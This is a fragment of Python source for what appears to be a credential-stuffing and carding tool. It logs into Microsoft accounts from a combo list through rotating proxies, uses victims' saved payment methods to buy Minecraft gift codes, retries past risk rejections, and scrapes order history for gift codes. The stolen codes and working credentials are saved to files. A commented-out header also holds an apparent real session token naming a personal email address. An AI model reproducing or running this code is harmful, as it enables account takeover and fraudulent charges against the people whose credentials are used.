    'language': self.locale,
    'partner': 'webblends',
    'piCid': self.accId,
    'piid': self.paymentInstrumentId,
    'purchaseOrderId': self.cartId,
    'redeemRewards': False,
    'rewardsPoints': 0,
    'signature': f'placeholder_for_paymentsession_signature_{self.threedsId}'}
        ),
        'operation': 'RenderPidlPage',
    }
            self.purchase_get_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/challengeDescriptions",params=challengeDesceptionsParams,headers=self.pm_mp_headers())
            time.sleep(0.2)
            purchaseData = {
        'cartId': self.cartId,
        'market': self.market,
        'locale': self.locale,
        'catalogClientType': '',
        'callerApplicationId': '_CONVERGED_XboxCom',
        'clientContext': {
            'client': 'XboxCom',
            'deviceFamily': 'Web',
        },
        'paymentSessionId': self.sessionId,
        'riskChallengeData': {
            'type': 'threeds2',
            'data': self.threedsId,
        },
        'rdsAsyncPaymentStatusCheck': False,
        'paymentInstrumentId': self.paymentInstrumentId,
        'paymentInstrumentType': self.ctype,
        'email': self.email,
        'csvTopOffPaymentInstrumentId': None,
        'billingAddressId': {
            'accountId': self.accId,
            'id': self.soldToAddressId,
        },
        'currentOrderState': 'CheckingOut',
        'flights': flights, 
        'itemsToAdd': {},
        }   
            time.sleep(1.2)
            while True:
                try:
                    purchaseResponse = self.purchase_session.post("https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase?appId=BuyNow",json=purchaseData,headers=self.getCartsHeader(), proxy=self.purchase_proxy).json()
                    break
                except:
                    continue
            
            time.sleep(0.5)
            cart = purchaseResponse.get("cart")
            if cart:
                Logger.Sprint('PURCHASED',f'Gifted : Minecraft Redeem Code: {self.email}, Retries={risk}',Fore.LIGHTGREEN_EX)
                Counter.Purchased +=1                
                with lock:
                    open('purchased.txt','a')
                    if not self.ms_creds in open('purchased.txt', "r").read().splitlines():
                        open('purchased.txt','a').write(f"{self.ms_creds}\n")
                try: 
                    Fetcher(self.ms_creds).FetchStuff()
                    Counter.MCfetchedpur +=1
                except:
                    Counter.Error +=1

                return "purchased"
            else:
                failReason = purchaseResponse['events']['cart'][0]['data']['reason']
                Logger.Sprint('FAILED',f"Failed={self.email} Error={failReason}",Fore.LIGHTRED_EX)
                print(purchaseResponse)
                Counter.Failed +=1
                open('results.txt', 'a').write(f"Failed={self.email} Error={failReason}"+'\n')
                if risk == 2:
                    return 'teri ammi'
                if failReason == "RiskRejected":
                    risk +=1
                    time.sleep(3.5)
                    continue
                else:
                    return 'lavd'
            # Logger.Sprint('ERROR',f"Unhandled Purchase Response on {self.email} -> {purchaseResponse}")
            
            

    def run(self):
        self.xbl3 = self.fetchAuth()
        if "fail" == self.xbl3:
            return
        Counter.Valid +=1
        instruments = self.getPaymentMethods()
        if instruments == []:
            Logger.Sprint('ERROR',f'No Payment Method: {self.email} ', Fore.LIGHTMAGENTA_EX)
            Counter.NoCards +=1
        else:
            open("cardishere.txt", "a").write(self.ms_creds+'\n')
            Counter.Cards +=1
            
        for inst in instruments:
            while True:
                purchase = self.purchase(inst['id'],inst['market'],inst['type'])
                if not purchase == "purchased":
                    break
                time.sleep(7)
            time.sleep(10)
        Fetcher(self.ms_creds).FetchStuff()

class Fetcher:
    def __init__(self, mscred:str) -> None:
        self.mscreds = mscred
        self.email = mscred.split(":")[0]
        self.password = mscred.split(":")[1]
        self.fetcher_session = requests.Session()
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self.request_exceptions = (requests.exceptions.SSLError,requests.exceptions.ProxyError,requests.exceptions.Timeout)
        self.proxytype = config['proxies']['Xsession']['proxyType']
        self.xsession = config['proxies']['Xsession']['login']
        self.use_proxy : str = config['proxies']['use_proxies']
        self.proxy = None
        self.fetcher_session.proxies = None
        self.getproxy()

    def getproxy(self):
        if self.use_proxy.lower() == "yes":
            if self.xsession == "0":
                if self.proxytype == "static":
                    self.proxy = random.choice(open("static_proxies.txt", "r").read().splitlines()).strip()
                    if '@' in self.proxy:
                        pass
                    else:
                        proxy_ip, proxy_port, username, password = self.proxy.split(':')
                        self.proxy = f"{username}:{password}@{proxy_ip}:{proxy_port}"
                    self.fetcher_session.proxies = {
                        "http": f"http://{self.proxy}",
                        "https": f"http://{self.proxy}"
                    }
                elif self.proxytype == "residental":
                    self.proxy = random.choice(open("residental_proxies.txt", "r").read().splitlines()).strip()
                    self.fetcher_session.proxies = {
                        "http": f"http://{self.proxy}",
                        "https": f"http://{self.proxy}"
                    }
                else:
                    self.proxy = None
                    self.fetcher_session.proxies = {
                        "http": self.proxy,
                        "https": self.proxy
                    }
                    Logger.Sprint('ERROR',f'Invalid Proxy Type: {self.proxytype}',Fore.LIGHTRED_EX)
            else:
                self.proxy = None
                self.fetcher_session.proxies = {
                    "http": self.proxy,
                    "https": self.proxy
                    }
        else:
            self.proxy = None
            self.fetcher_session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }
    def FetchStuff(self):
        headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'identity',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': self.ua,
    }

        while True:
            try:
                response = self.fetcher_session.get('https://login.live.com/ppsecure/post.srf', headers=headers,timeout=20).text
                break
            except self.request_exceptions:
                self.getproxy()
                Counter.Error +=1
                continue
            except Exception as e:
                print(e)
                Logger().Sprint("ERROR", str(e), Fore.YELLOW)
                return 'lol'
        try:
            ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
            log_url = response.split(",urlPost:'")[1].split("'")[0]
        except:
            Logger().Sprint("ERROR", "[-] Unknown Error (Proxies probably banned)", Fore.LIGHTRED_EX)
            return 'lol'
        log_data = f'i13=0&login={self.email}&loginfmt={self.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
        headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': self.ua,
                }  
        while True:
            try:
                response = self.fetcher_session.post(log_url,timeout=20,data=log_data,headers=headers)
                break
            except self.request_exceptions:
                self.getproxy()
                Counter.Error +=1
                continue
            except Exception as e:
                Logger().Sprint("ERROR", str(e), Fore.YELLOW)
                return 'lol'
        if 'https://privacynotice.account.microsoft.com/notice' in response.text:
            privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
            corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
            mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
            while True:
                try:
                    privNotifPage = self.fetcher_session.post(privNotifUrl,headers={
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'path' : privNotifUrl.replace('https://privacynotice.account.microsoft.com',''),
        'accept-language': 'en-US,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://login.live.com',
        'referer': 'https://login.live.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent':self.ua,
    },data={'correlation_id':corelationId,
            'code':mCode}).text
                    break
                except:
                    continue
            try:
                m = MultipartEncoder(fields={'AppName': 'ALC',
        'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
        'ConsentSurface': 'SISU',
        'ConsentType': 'ucsisunotice',
        'correlation_id': corelationId,
        'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
        'DeviceId':'' ,
        'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0],
        'FormFactor': 'Desktop',
        'InitVector':privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
        'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
        'ModelType': 'ucsisunotice',
        'ModelVersion': '1.11',
        'NoticeId': privNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
        'Platform': 'Web',
        'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
        'UserVersion': '1'},boundary='----WebKitFormBoundary' \
                + ''.join(random.sample(string.ascii_letters + string.digits, 16)))
            except:
                return 'gaybehavior'
            headers = {
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.7',
        'content-type': m.content_type,
        'origin': 'https://privacynotice.account.microsoft.com',
        'referer': privNotifUrl,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': self.ua,
    }

            while True:
                try:
                    response = self.fetcher_session.post('https://privacynotice.account.microsoft.com/recordnotice', headers=headers, data=m)
                    break
                except self.request_exceptions:
                    self.getproxy()
                    Counter.Error +=1
                    continue
                except:
                    continue

            while True:
                try:
                    response = self.fetcher_session.get(urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1]),headers={
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.6',
            'Connection': 'keep-alive',
            'Referer': 'https://privacynotice.account.microsoft.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.ua,
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        })
                    break
                except self.request_exceptions:
                    self.getproxy()
                    Counter.Error +=1
                    continue
                except:
                    continue
        try:
            ppft2 = re.findall("sFT:'(.+?(?=\'))", response.text)[0],
            url_log2 = re.findall("urlPost:'(.+?(?=\'))", response.text)[0]
        except:
            return 'lol'


        log_data2 = {
        "LoginOptions": "3",
        "type": "28",
        "ctx": "",
        "hpgrequestid": "",
        "PPFT": ppft2,
        "i19": "19130"
    }
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.live.com',
            'Referer': log_url,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.ua,
        }
        while True:
            try:
                midAuth2 = self.fetcher_session.post(url_log2,timeout=20,data=log_data2,headers=headers).text
                break
            except self.request_exceptions:
                self.getproxy()
                Counter.Error +=1
                continue
            except Exception as e:
                Logger().Sprint(e,"r")
                return 'lol'
        while "fmHF" in midAuth2:
            midAuth2 = {
    "fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
    "pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
    "nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
    "anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
    "t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
            data = {
        'pprid': midAuth2["fmHF"],
        'NAP': midAuth2['nap'],
        'ANON': midAuth2['anon'],
        't': midAuth2['t'],
    }
            loda_lund = midAuth2['fmHF']
            while True:
                try:
                    midAuth2 = self.fetcher_session.post(loda_lund,data=data,headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        # 'Cookie': 'display-culture=en-US; MicrosoftApplicationsTelemetryDeviceId=8c2b8809-97eb-4046-998e-710ac9d94bf0; MSFPC=GUID=6426b6c6378846b8ba38a219c60e10e9&HASH=6426&LV=202302&V=4&LU=1677313904985; ak_bmsc=503BA55230428C4CCE38BAA4072A528C~000000000000000000000000000000~YAAQHcITAvM1nDyGAQAAr1QsjBJ1lziRJTG02hd3wdgw0/8Bvf+1k8C/XXnZyx6sk126z3AlO0gdjwqIoOLiGxrPIDDMAaCIn5oQyCWBvQe14CZIBYugRCy7LOHvfHwFMTJ8f/HjNev2JjIFAyfuFfEloFJyoUbniTKgoW+mw3r7/e6ZWrbgz+3ok7dsuM7I2R0rW4TsIGosgBhi3KRv16A+V+tV/ePDKfis6z6OvXd8mq/CmP+pOrvvH9++J2YQE9kd0y5lRMtiTwqUl0YBy1Zky3UY/QRkodMdAosBrULRrqHjvbP8vnduKg7s2ai2WEJJj3gBqqHlc1nFGhv1BpJ2E3stii7rAzlb/23c3+JGH70h7fyxf517dHId73QWp/1GdQ==; AMCSecAuthJWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImJXOFpjTWpCQ25KWlMtaWJYNVVRRE5TdHZ4NCJ9.eyJ2ZXIiOiIyLjAiLCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vOTE4ODA0MGQtNmM2Ny00YzViLWIxMTItMzZhMzA0YjY2ZGFkL3YyLjAiLCJzdWIiOiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFDVnRXSEJkRUxubi1BV0daOVdldXNVIiwiYXVkIjoiODFmZWFjZWQtNWRkZC00MWU3LThiZWYtM2UyMGEyNjg5YmI3IiwiZXhwIjoxNjc3NDc1MzYxLCJpYXQiOjE2NzczODg2NjEsIm5iZiI6MTY3NzM4ODY2MSwibmFtZSI6ImdpemNobyBhdGl0c28iLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJnaXpjaG9hdGl0c29jQGhvdG1haWwuY29tIiwib2lkIjoiMDAwMDAwMDAtMDAwMC0wMDAwLTcyYTYtMzBlNGVlNjI5OWUyIiwidGlkIjoiOTE4ODA0MGQtNmM2Ny00YzViLWIxMTItMzZhMzA0YjY2ZGFkIiwibG9naW5faGludCI6Ik0kRWpWNG5PUDRkT2JRd25kM2I1eDV4Q2drbVo1WmxaeVJuMWlTV1ZLY24teVFrVi1TbTVpWm81ZWNueXN4NC1EbER5d0E5bjRVOVEiLCJwdWlkIjoiMDAwNkJGRkQyNzVGQ0Y5NyIsImFnZUdyb3VwIjozLCJhaW8iOiJEWXl6Z0R4Y0xBTkFZbE1Zczdaa3hMV0pJcDJCMTFiS1lHUTYwdDQwSWVWRnYyN2VPeG5MN2xIQUQzSGtYa3RoeUp6IWVha2Jvdzlvalp5R0tuKjRFa0JNWnBubVlQMklMMXZqbjVNIXd1SHVXTHN4dFo2S3Z2N2p5eG5HU2U0M2s4NFVhVXdSN1dCZWNnYUhLbjdJRTRvJCJ9.Q0f1cJKW30TN09O7Tn5fReykinZR-KQq0iDm4tW2sKEqpSz-oRHPyWriKsxgsyf425o-DKEMkddOGodL6rrNKvMHJMUF-UdYy2EVQpqX9LfiecXza_iX15llWvnBr3QJOd9gSkQ2HXBWTj0yBXyshA8c4f2tP33dRmgFaVePwyYfVWBKn5b_-EQepflhOfFsbXCAPYvffqLqN7g3My2X3Ef0ieWq2DK5oTyfbROQ_WiMdEevSCO2g6gC85xSK8Rpk0SzKWkJu9Bt6d6TL0xN2p87g7AO8SbA5d3isqbjwnUiCd3bfgu8I52LbMVrYiBjXoELMh9o3awsb1VxVfrdrQ; AMC-MS-CV=3icdaSHkZ0O6B6w4.5.0; bm_sv=A4E33E54E4DE78AB15702DC931F5AB2D~YAAQHcITAsA2nDyGAQAAw2UsjBKQb2Dy46001KPNu78PhivoGk4KwPoNK91T4NkyQjOi2BAvndxHGNOfmWIEZleitKQMeBozF7/tSUgXAdqLoX5VSlKjk1sLfgZzgsAzFycJ1GgRjuZX8AY7zIhfjA3yYLQWLNVXizsFKIx+g5GwqyT85NqZxrkn4S5aR0bKGQ/bx627865Q24O69yDMmIQg2CeEA5/GeykK5Ah13g93rqpvHh0CvTf7povvfE0Vw9u2~1',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': self.ua,
    }).text     
                    break
                except self.request_exceptions:
                    self.getproxy()
                    Counter.Error +=1
                    continue
                except Exception as e:
                    Logger().Sprint(e,"r")
                    return 'lol'
        headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': self.ua,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

        params = {
        'fref': 'home.drawers.payment-options.manage-payment',
        'refd': 'account.microsoft.com',
    }
        while True:
            try:
                response = self.fetcher_session.get('https://account.microsoft.com/billing/payments', params=params, headers=headers)
                break
            except self.request_exceptions:
                self.getproxy()
                Counter.Error +=1
                continue
            except Exception as e:
                Logger().Sprint(e,"r")
                return 'lol'
        try: 
            vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        except:
            try:
                fuck = response.text.split('<meta name="description" content="')[1].split('"')[0]
                if fuck == "Try again later":
                    print(Fore.LIGHTYELLOW_EX +f"[-] Microsoft Server Down: Please {fuck}")
                    return 'exit'
            except:
                return 'fuck you mother fucker'
        
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip,deflate,br',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Host': 'account.microsoft.com',
            'MS-CV': f"{Purchase.generateHexStr(18)}.7.51",
            'Referer': response.url,
            'Origin': 'https://login.live.com',
            'Referer': log_url,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.ua,
            '__RequestVerificationToken': vrf_token,
        }
        params = {
            'period': 'ThreeMonths',
            'orderTypeFilter': 'All',
            'filterChangeCount': '0',
            'isInD365Orders': True,
            'isPiDetailsRequired': True,
            'timeZoneOffsetMinutes': '-330',
        }
        json_data = self.fetcher_session.get("https://account.microsoft.com/billing/orders/list", params=params, headers=headers).json()
        try:
            total_orders = json_data['orders']
            orders_count = len(total_orders)
            # Logger.Sprint("INFO", f"Total Order Found: {orders_count}", Fore.LIGHTMAGENTA_EX)
            for index, order in enumerate(total_orders, start=1):
                for item_index, item in enumerate(order['items'], start=1):
                    order_name = item['localTitle']
                    order_status = item['itemState']
                    Logger().Sprint("RESULT", f"[{index}] Product Name -=> {order_name}: {order_status}", Fore.LIGHTCYAN_EX)
                    if "Minecraft" in order_name and "GiftSent" in order_status:
                        Counter.MCFetched +=1
                        giftcode = item['giftCode']
                        ip = order['address']['regionName']
                        print(Fore.LIGHTYELLOW_EX + f"[+] Minecraft Redeem Code Found. ")
                        with Lock:
                            open("codes.txt", "a").write(giftcode + ":" + ip + "\n")
                        
                    if "Xbox Game Pass Ultimate" in order_name and "December" in order['localSubmittedDate']:
                        Counter.gamepasses +=1
                        with Lock:
                            open("gamepasses.txt", "a")
                            if not self.mscreds in open("gamepasses.txt", "r").read().splitlines():
                                open("gamepasses.txt", "a").write(self.mscreds +'\n')

                    if "GiftSent" in order_status and not "Minecraft" in order_name:
                        Counter.etc_fetched +=1
                        giftcodeother = item['giftCode']
                        ipother = order['address']['regionName']
                        with Lock:
                            open("other_codes.txt", "a").write(giftcodeother + " : " + ipother + " : " + order_name + "\n")

        except KeyError:
            print(f"[-] No Orders Found. ")
        except Exception as e:
            print("[-] An error occurred:", e)             
        return 'done'

def start_thread():
    while True:
        try:
            mscreds = random.choice(combo)
            combo.remove(mscreds)

            try:
                Purchase(mscreds).run()
            except IndexError:
                continue

            except Exception as e:
                print("Exception Occured: " + str(e))
                continue

        except IndexError:
            break

        except Exception as e:
            print("Exception Occured: " + str(e))
            continue

class FullScreenApp:
    def __init__(self):
        self.start_time = time.time()

    def format_time(self, seconds):
        hours, remainder = divmod(seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"

    def tk_loop(self):
        while True:
            elapsed_time_seconds = round(time.time() - self.start_time)
            elapsed_time_str = self.format_time(elapsed_time_seconds)
            print(Fore.LIGHTYELLOW_EX+f'''
─────────███──────────███
────────█▓▓▓█────────█▓▓▓█
───────█▓▓▓▓██████████▓▓▓▓█             ░██████╗██╗░░░░░███████╗███████╗██████╗░██╗███╗░░██╗░██████╗░  ███╗░░░███╗░█████╗░██╗░░░██╗░██████╗███████╗
───────█▓▓▓██▒▒▒▒▒▒▒▒██▓▓▓█             ██╔════╝██║░░░░░██╔════╝██╔════╝██╔══██╗██║████╗░██║██╔════╝░  ████╗░████║██╔══██╗██║░░░██║██╔════╝██╔════╝
────────████▒▒▒▒▒▒▒▒▒▒████              ╚█████╗░██║░░░░░█████╗░░█████╗░░██████╔╝██║██╔██╗██║██║░░██╗░  ██╔████╔██║██║░░██║██║░░░██║╚█████╗░█████╗░░
──────────█▒▒▒██▒▒██▒▒▒█                ░╚═══██╗██║░░░░░██╔══╝░░██╔══╝░░██╔═══╝░██║██║╚████║██║░░╚██╗  ██║╚██╔╝██║██║░░██║██║░░░██║░╚═══██╗██╔══╝░░
──────────█▒▒▒▒▒▒▒▒▒▒▒▒█                ██████╔╝███████╗███████╗███████╗██║░░░░░██║██║░╚███║╚██████╔╝  ██║░╚═╝░██║╚█████╔╝╚██████╔╝██████╔╝███████╗          
──────────█▒▒▒▒░██░▒▒▒▒█                ╚═════╝░╚══════╝╚══════╝╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░░░░╚═╝░╚════╝░░╚═════╝░╚═════╝░╚══════╝    
──────────██▒▒▓▒▒▒▒▓▒▒██
───────────██▒▒▓▓▓▓▒▒██                 Threads: {int(config['threading']['threadCount'])}
────────────█▒▒▒▒▒▒▒▒█                  Invalid: {Counter.Invalid}
─────████████████████████████           Valid: {Counter.Valid}
───▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▓▓▓▓         Minecraft Fetched: {Counter.MCFetched}                      Payment Methods Found: {Counter.Cards}
──▓▓▒▒▓▒░░░░░░░░░░░░░░░░░░▒▓▒▒▓▓        Other Codes: {Counter.etc_fetched}                          No Payment Methods Found: {Counter.NoCards}
──▓▒▒▒▓░░░*♥GOOD MORNING!**♥░░▒▓▒▒▒▓    Gamepasses: {Counter.gamepasses}                            Purchased Fetched: {Counter.MCfetchedpur}
──▓▓▒▒▓▒▒░░░░░░░░░░░░░░░░▒▒▓▒▒▓▓        Purchased: {Counter.Purchased}
───▓▓▒▓▒▒░░░░░░░░░░░░░░░░▒▒▓▒▓▓         Failed: {Counter.Failed}
─────████████████████████████           Remaining: {Counter.total - Counter.used}
─────────█▒▒▓▓▓▓▓▓▓▓▓▒▒█                Total: {Counter.total}
────────██▒▒▓▓▓▓▓▓▓▓▓▒▒██               Elapsed Time: {elapsed_time_str}
───────-█▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▓█             Error: {Counter.Error}
─███▄─█▒▒▓▒▒▒▓▓▓▓▓▓▓▒▒▒▓▒▒█─▄███aa
█▓▓▓██▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒██▓▓▓█     LUCKY SONG
█▓▓▓▓█▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒█▓▓▓▓█       WE LIVE 
█▓▓▓▓██▒▒▒▒▓█████████▓▒▒▒▒██▓▓▓▓█       WE LOVE
█▓▓▓▓▓█▒▒▒█▓─────────▓█▒▒▒█▓▓▓▓▓█       WE LIE
─█▓▓▓▓█▒██▓───────────▓██▒█▓▓▓▓█        DU DU DU
──█▓▓▓██▓▓─────────────▓███▓▓▓█         DU DU DU
───████▓────────────────▓█████       BY ALAN WALKER
                                                                                        
''')
            time.sleep(0.2)
            if int(Counter.total) - int(Counter.used)==0:
                break
            os.system('cls')

if __name__=="__main__":
    threads = int(config['threading']['threadCount'])
    for _ in range(threads):
        threading.Thread(target=start_thread).start()
    
    # FullScreenApp().tk_loop()
    
    
